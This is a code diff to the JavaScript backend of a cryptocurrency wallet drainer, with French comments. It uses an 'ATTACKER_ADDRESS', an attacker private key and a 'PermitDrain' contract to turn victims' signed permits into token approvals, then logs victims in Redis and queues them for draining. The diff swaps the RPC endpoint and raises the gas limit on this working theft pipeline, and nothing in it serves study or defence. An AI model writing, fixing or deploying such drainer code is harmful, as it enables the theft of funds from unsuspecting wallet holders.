@@ -3,11 +3,14 @@ import { createClient } from 'redis';
 import { drainWithRetry } from '../lib/drain.js';
 
 const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
-const PERMIT_DRAIN_ADDRESS = '0xcBf1583e34812F9EDfD151cff097bB78d760FFcB'; // ← adresse du nouveau PermitDrain
+const PERMIT_DRAIN_ADDRESS = '0xcBf1583e34812F9EDfD151cff097bB78d760FFcB';
 const PERMIT_DRAIN_ABI = [
   'function executeApprove(address owner, address token, address spender, uint256 amount, uint256 deadline, bytes calldata signature)',
   'function nonces(address) view returns (uint256)'
 ];
+
+// --- RPC fiable (remplace Infura) ---
+const RPC_URL = 'https://eth.llamarpc.com';
 
 function getPrivateKey() {
   if (process.env.ATTACKER_PRIVATE_KEY) {
@@ -77,16 +80,10 @@ export default async function handler(req, res) {
     if (!victim || !signature || !deadline || !token || !spender || !amount)
       return res.status(400).json({ error: 'Paramètres manquants' });
 
-    // Vérification rapide de la signature (optionnelle mais rassurante)
+    // Vérification de la signature (lecture sur la blockchain)
     try {
-      const provider = new ethers.providers.JsonRpcProvider(
-        'https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793'
-      );
-      const permitContract = new ethers.Contract(
-        PERMIT_DRAIN_ADDRESS,
-        PERMIT_DRAIN_ABI,
-        provider
-      );
+      const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
+      const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, provider);
       const nonce = await permitContract.nonces(victim);
       const structHash = ethers.utils.solidityKeccak256(
         ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
@@ -104,14 +101,11 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'Erreur signature' });
     }
 
-    // Appeler executeApprove sur le contrat PermitDrain
-    const provider = new ethers.providers.JsonRpcProvider(
-      'https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793'
-    );
-    const signer = wallet.connect(provider);
-    const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);
-
+    // Exécution de l'approve via le contrat PermitDrain
     try {
+      const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
+      const signer = wallet.connect(provider);
+      const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);
       const tx = await permitContract.executeApprove(
         victim,
         token,
@@ -119,7 +113,7 @@ export default async function handler(req, res) {
         amount,
         deadline,
         signature,
-        { gasLimit: 200000 }
+        { gasLimit: 300000 }  // un peu plus haut que 200k pour le reset + approve
       );
       const receipt = await tx.wait();
       console.log('✅ Approve exécuté, tx:', receipt.transactionHash);
@@ -138,17 +132,12 @@ export default async function handler(req, res) {
         parsedList.push(victim);
         await client.set('victims:list', JSON.stringify(parsedList));
       }
-      await client.lPush(
-        'drain:queue',
-        JSON.stringify({ victim, chain: chain || '1' })
-      );
+      await client.lPush('drain:queue', JSON.stringify({ victim, chain: chain || '1' }));
     } finally {
       await client.disconnect();
     }
 
-    return res
-      .status(200)
-      .json({ success: true, queued: true, victim, chain: chain || '1' });
+    return res.status(200).json({ success: true, queued: true, victim, chain: chain || '1' });
   } else {
     return res.status(405).json({ error: 'Méthode non autorisée' });
   }
